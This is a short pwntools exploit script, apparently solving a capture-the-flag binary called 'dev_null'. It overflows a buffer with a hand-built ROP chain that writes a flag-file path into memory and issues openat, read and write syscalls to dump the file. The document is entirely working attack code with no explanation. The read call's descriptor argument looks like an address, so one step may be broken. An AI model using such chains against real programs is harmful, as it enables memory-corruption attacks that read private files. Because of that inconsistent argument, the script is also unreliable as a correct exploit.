from pwn import *
elf = context.binary = ELF("./dev_null")
offset = 16
p = process()

mov_rsi_rax = p64(0x0000000000420f45)
pop_rsi_rbp = p64(0x0000000000402acc)
pop_rax = p64(0x000000000042193c)
pop_rdi = p64(0x0000000000413795)
pop_rdx_rbx_r11_r12_r13 = p64(0x000000000046ddce)
sysc = p64(0x000000000040143c)
data = 0x00000000004ae0a0
data2 = data + 8
data3 = data + 16
str1 = b"/home/ct"
str2 = b"f/flag.t"
str3 = b"xt\x00\x00\x00\x00\x00\x00"

payload = b"A" * offset + pop_rax + str1 + pop_rsi_rbp + p64(data) + p64(0x0) + mov_rsi_rax + pop_rax + str2 + pop_rsi_rbp + p64(data2) + p64(0x0) + mov_rsi_rax + pop_rax + str3 + pop_rsi_rbp + p64(data3) + p64(0x0) + mov_rsi_rax + pop_rdi + p64(0xffffffffffffff9c) + pop_rsi_rbp + p64(data) + p64(0x0) + pop_rdx_rbx_r11_r12_r13 + p64(0x0) + p64(0x1) + p64(0x0) + p64(0x0) + p64(0x0) + pop_rax + p64(0x101) + sysc + pop_rdi + p64(0x00000000004137a5) + pop_rsi_rbp + p64(data + 24) + p64(0x0) + pop_rdx_rbx_r11_r12_r13 + p64(0x10) + p64(0x1) + p64(0x0) + p64(0x0) + p64(0x0) + pop_rax + p64(0x0) + sysc + pop_rdi + p64(0x1) + pop_rsi_rbp + p64(data) + p64(0x0) + pop_rdx_rbx_r11_r12_r13 + p64(0x10) + p64(0x1) + p64(0x0) + p64(0x0) + p64(0x0) + pop_rax + p64(0x1) + sysc
write("payload",payload)
p.sendline(payload)
print(p.recvall())